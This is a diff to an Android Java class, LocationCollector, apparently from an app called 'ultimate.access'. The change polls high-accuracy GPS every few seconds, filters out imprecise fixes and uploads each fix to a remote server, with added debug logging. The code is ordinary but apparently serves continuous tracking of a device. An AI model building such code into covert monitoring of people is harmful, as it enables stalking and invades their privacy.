@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.os.Looper;
+import android.util.Log;
 
 import androidx.core.content.ContextCompat;
 
@@ -13,6 +14,7 @@ import com.google.android.gms.location.LocationCallback;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.Priority;
 import com.ultimate.access.network.ApiClient;
 import com.ultimate.access.network.ApiService;
 
@@ -21,6 +23,7 @@ import java.util.Map;
 
 public class LocationCollector {
 
+    private static final String TAG = "LocationCollector";
     private Context context;
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
@@ -34,27 +37,50 @@ public class LocationCollector {
     public void startCollection() {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                 != PackageManager.PERMISSION_GRANTED) {
+            Log.e(TAG, "Location permission not granted");
             return;
         }
 
+        // 🔥 HIGH ACCURACY LOCATION REQUEST
         LocationRequest locationRequest = LocationRequest.create()
-                .setInterval(10000)  // 10 seconds
-                .setFastestInterval(5000)  // 5 seconds
-                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+                .setInterval(5000)                  // 5 seconds
+                .setFastestInterval(2000)            // 2 seconds
+                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
+                .setSmallestDisplacement(0);          // 0 meter movement pe bhi update
+
+        // 🔥 For Android 12+ (API 31+)
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+            locationRequest.setPriority(Priority.PRIORITY_HIGH_ACCURACY);
+        }
 
         locationCallback = new LocationCallback() {
             @Override
             public void onLocationResult(LocationResult locationResult) {
                 if (locationResult != null) {
                     for (Location location : locationResult.getLocations()) {
-                        lastLocation = location;
-                        sendLocationToServer(location);
+                        if (location != null) {
+                            // 🔥 SIRF ACCURATE LOCATION BHEJO (accuracy < 50m)
+                            if (location.hasAccuracy() && location.getAccuracy() < 50) {
+                                lastLocation = location;
+                                sendLocationToServer(location);
+                                Log.d(TAG, "📍 Location: " + location.getLatitude() + ", " + location.getLongitude() +
+                                        " | Accuracy: " + location.getAccuracy() + "m");
+                            } else {
+                                Log.d(TAG, "⚠️ Low accuracy location ignored: " +
+                                        (location.hasAccuracy() ? location.getAccuracy() + "m" : "No accuracy"));
+                            }
+                        }
                     }
                 }
             }
         };
 
-        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
+        try {
+            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
+            Log.d(TAG, "✅ Location collection started");
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception: " + e.getMessage());
+        }
     }
 
     private void sendLocationToServer(Location location) {
@@ -77,12 +103,16 @@ public class LocationCollector {
             @Override
             public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                    retrofit2.Response<ApiService.ServerResponse> response) {
-                // Location sent successfully
+                if (response.isSuccessful()) {
+                    Log.d(TAG, "✅ Location sent to server");
+                } else {
+                    Log.e(TAG, "❌ Location send failed: " + response.code());
+                }
             }
 
             @Override
             public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
-                // Failed to send location
+                Log.e(TAG, "❌ Location send error: " + t.getMessage());
             }
         });
     }
@@ -90,6 +120,7 @@ public class LocationCollector {
     public void stopCollection() {
         if (fusedLocationClient != null && locationCallback != null) {
             fusedLocationClient.removeLocationUpdates(locationCallback);
+            Log.d(TAG, "🛑 Location collection stopped");
         }
     }
 
